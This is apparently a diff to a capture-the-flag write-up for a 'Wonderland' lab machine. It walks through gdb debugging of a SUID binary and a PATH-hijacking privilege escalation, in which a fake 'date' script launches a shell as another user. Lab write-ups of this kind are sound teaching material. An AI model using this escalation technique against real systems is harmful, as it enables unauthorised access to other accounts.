@@ -208,13 +208,96 @@ The script waits for us aswell to send some input in STDIN. After typing a rando
 
 This surely looks like a buffer overflow vulnerability! The executable has the SUID bit set as well which means that a successful exploitation could grant us root access. To continue we try and check if gdb is installed which was not the case. "readelf" tool which shows info about the executable was not installed either. Only thing we could do was to send the file to our machine and try and examine it locally (Even though it would be really hard to exploit the buffer overflow without a disassembler but maybe we could find something hidden in the file). After sending the file, we start by examining it:
 
-![Wonderland](imgs/teaPartyreadelf.png)
+```bash
+$ readelf -h teaParty
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              DYN (Position-Independent Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x1090
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          14896 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         11
+  Size of section headers:           64 (bytes)
+  Number of section headers:         30
+  Section header string table index: 29
+```
 
 So its a x64 ELF. Even though I hadn't wroked with other than x86 executables I wanted to give it a try. So let's disassemble it with gdb:
 
 ![Wonderland](imgs/teaPartydisassembled.png)
 
-First thing that stood out to me was that there's no testing instructions (neither cmp nor test) so assuming that the file would print out something if our input was correct, is wrong. So what is this file really doing..? After putting in some breaks and checking the registers to see where the memory corruption was happening from our input, I found nothing in particular. No trace for out input in any critical register.  
+First thing that stood out to me was that there's no testing instructions (neither cmp nor test) so assuming that the file would print out something if our input was correct, is wrong. So what is this file really doing..? After putting in some breaks and checking the registers to see where the memory corruption was happening from our input, I found nothing in particular. No trace for our input in any critical register. So where's the "Segmentation fault" error coming from? I decided to break each "puts" instruction to see what it outputs (puts is used to write to stdout). After reaching the final puts i got the following
+```
+(gdb) b *0x00005555555551bd
+Breakpoint 1 at 0x5555555551bd
+(gdb) b* 0x00005555555551c2
+Breakpoint 2 at 0x5555555551c2
+(gdb) r
+...
+Breakpoint 1, 0x00005555555551bd in main ()
+(gdb) c
+Continuing.
+Segmentation fault (core dumped)
+
+Breakpoint 2, 0x00005555555551c2 in main ()
+```
+So afterall, the "Segmentation fault" error was just printed out and not really the result of an error. How silly.. Okay so at this point I decided to abandon the file and search elsewhere on the machine. After searching for a while and finding nothing, I returned to this file which was the only lead i had to continue. After re-examining it with gdb, I noticed something a message printed out during execution that I hadn't focused on before.
+```
+(gdb) r
+Starting program: /home/kali/thm/wonderland/teaParty 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+[Detaching after vfork from child process 38426]
+```
+Our program is creating a child process. So what other thing is actually being executed here? After searching around about it, I found that its possible to follow and catch the child process with gdb. First we break at the instruction which is executing the child process (which is instruction system at <+43>) and right after it. After reaching the first one, we write in gdb the following command, then we continue
+```
+set follow-fork-mode child
+(gdb) c
+process 41543 is executing new program: /usr/bin/dash
+
+Thread 2.1 "sh" received signal SIGSEGV, Segmentation fault.
+[Switching to process 41543]
+0x00007ffff7fd94d9 in resolve_map (r_type=1, version=0x7ffff80356f0, ref=0x7fffffffda98, scope=0x7ffff7ffe668, l=0x7ffff7ffe2e0) at ./elf/dl-reloc.c:188
+188     ./elf/dl-reloc.c: No such file or directory.
+
+```
+So the program created a new process with PID 41543. We check it with the "ps" command:
+```bash
+$ ps -auxw | grep '41543'
+kali       41543  0.0  0.0   2524   400 pts/3    t    20:19   0:00 sh -c /bin/echo -n 'Probably by ' && date --date='next hour' -R
+```
+So the program is executing a bash command! Its like we have a file ".sh" which is being run. If we manipulate the environment path we execute whatever we want! The steps go as follows:
+```bash
+rabbit@wonderland:/tmp$ echo "/bin/bash ; " > /tmp/date
+rabbit@wonderland:/home/rabbit$ /bin/chmod +x /tmp/date
+rabbit@wonderland:/home/rabbit$ ./teaParty 
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by bash: groups: command not found
+Command 'lesspipe' is available in the following places
+ * /bin/lesspipe
+ * /usr/bin/lesspipe
+The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
+lesspipe: command not found
+Command 'dircolors' is available in '/usr/bin/dircolors'
+The command could not be located because '/usr/bin' is not included in the PATH environment variable.
+dircolors: command not found
+hatter@wonderland:/home/rabbit$ whoami
+hatter
+```
+The shell command executed by the script calls command "date" without specifying the full path "/bin/date". The exploit would be to create our own executable "date" and change the environment path with export. Once the script calls "date", it will run the one we created. It would be basically creating a shell for us. And just like that we got ourselves a shell with user hatter
 
 ---
 ### Post Exploitation
